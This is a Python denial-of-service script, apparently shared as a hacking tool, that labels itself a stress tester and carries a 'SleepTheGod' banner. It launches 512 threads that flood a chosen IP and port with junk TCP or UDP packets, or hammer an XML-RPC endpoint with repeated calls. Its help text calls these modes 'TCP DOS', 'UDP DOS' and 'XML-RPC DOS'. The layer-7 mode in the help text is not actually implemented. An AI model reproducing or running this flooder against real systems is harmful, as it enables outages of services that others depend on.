import socket
import threading
import logging
import sys
import getopt
import time
from xmlrpc.client import ServerProxy, Fault

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Global constants
HEADER = """
/*
|---------------------------------------------------|
          ____  ____________   ____  ____  _____
         / __ \/ ____/ ____/  / __ \/ __ \/ ___/
        / /_/ / __/ / __/    / / / / / / /\__ \ 
       / _, _/ /___/ /___   / /_/ / /_/ /___/ / 
      /_/ |_/_____/_____/  /_____/\____//____/  
                                              
|---------------------------------------------------|
         _________            __       
        / ____/ (_)__  ____  / /_ _____
       / /   / / / _ \/ __ \/ __// ___/
      / /___/ / /  __/ / / / /__/ /__  
      \____/_/_/\___/_/ /_/\__(_)___/  

|---------------------------------------------------|

               CODED BY SLEEPTHEGOD
                                                                                               
|---------------------------------------------------|
*/
"""

THREAD_COUNT = 512

class StressTestThread(threading.Thread):
    def __init__(self, target_ip, target_port, protocol, request_data=None):
        super().__init__()
        self.target_ip = target_ip
        self.target_port = target_port
        self.protocol = protocol
        self.request_data = request_data
        self.kill_received = False

    def run(self):
        while not self.kill_received:
            try:
                if self.protocol.upper() == 'TCP':
                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                        s.connect((self.target_ip, self.target_port))
                        s.sendall(self.request_data or b'X' * 9999)
                elif self.protocol.upper() == 'UDP':
                    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                        s.sendto(self.request_data or b'X' * 9999, (self.target_ip, self.target_port))
                else:
                    logging.error("Invalid protocol: %s. Use TCP or UDP.", self.protocol)
            except Exception as e:
                logging.error("Error in stress test: %s", e)

class XMLRPCThread(threading.Thread):
    def __init__(self, site, method_name, params):
        super().__init__()
        self.site = site
        self.method_name = method_name
        self.params = params
        self.kill_received = False

    def run(self):
        while not self.kill_received:
            try:
                server = ServerProxy(self.site)
                method = getattr(server, self.method_name)
                method(*self.params)
            except Fault as e:
                logging.error("XML-RPC Fault: %s", e)
            except Exception as e:
                logging.error("Error in XML-RPC attack: %s", e)

def launch_stress_test(target_ip=None, target_port=None, protocol=None, site=None, method_name=None, params=None, request_data=None):
    threads = []
    logging.info('=' * 60)
    logging.info('Advanced Stress Test by SleepTheGod | Version 2.0'.center(60, '-'))
    logging.info('=' * 60)

    if site and method_name:
        logging.info("Starting XML-RPC stress test on %s with method %s", site, method_name)
        for _ in range(THREAD_COUNT):
            thread = XMLRPCThread(site, method_name, params)
            thread.start()
            threads.append(thread)
    elif target_ip and target_port and protocol:
        logging.info("Starting Layer 4 stress test (protocol: %s) on %s:%d", protocol, target_ip, target_port)
        for _ in range(THREAD_COUNT):
            thread = StressTestThread(target_ip, target_port, protocol, request_data)
            thread.start()
            threads.append(thread)

    try:
        while any(thread.is_alive() for thread in threads):
            time.sleep(1)
    except KeyboardInterrupt:
        logging.info("Ctrl-C received! Sending kill signal to threads...")
        for thread in threads:
            thread.kill_received = True
        for thread in threads:
            thread.join()

def main(argv):
    target_ip = None
    target_port = None
    protocol = None
    site = None
    method_name = None
    params = None
    request_data = None

    try:
        opts, args = getopt.getopt(argv, "ht:l4:x:", ["help", "type=", "layer4=", "xmlrpc="])
    except getopt.GetoptError as err:
        logging.error("Option parsing error: %s", str(err))
        sys.exit(2)

    for opt, arg in opts:
        if opt in ("-h", "--help"):
            print(HEADER)
            print("Usage:")
            print("  For Layer 7 stress testing mode:")
            print("    GET DOS - python script.py -t get http://example.com")
            print("    POST DOS - python script.py -t post http://example.com")
            print("  For Layer 4 stress testing mode:")
            print("    TCP DOS - python script.py -l4 tcp 192.168.1.1 80")
            print("    UDP DOS - python script.py -l4 udp 192.168.1.1 80")
            print("  For XML-RPC stress testing mode:")
            print("    XML-RPC DOS - python script.py -x http://example.com/RPC2 method_name param1 param2 ...")
            sys.exit()
        elif opt in ("-t", "--type"):
            dos_type = arg
            if args:
                site = args[0]
        elif opt in ("-l4", "--layer4"):
            protocol = arg
            if len(args) >= 2:
                target_ip = args[0]
                target_port = int(args[1])
        elif opt in ("-x", "--xmlrpc"):
            if len(args) >= 2:
                site = arg
                method_name = args[0]
                params = args[1:]

    if site and method_name:
        launch_stress_test(site=site, method_name=method_name, params=params)
    elif target_ip and target_port and protocol:
        launch_stress_test(target_ip=target_ip, target_port=target_port, protocol=protocol, request_data=b'X' * 9999)
    else:
        logging.error("Invalid arguments. Use -h or --help for usage information.")
        sys.exit(2)

if __name__ == "__main__":
    main(sys.argv[1:])
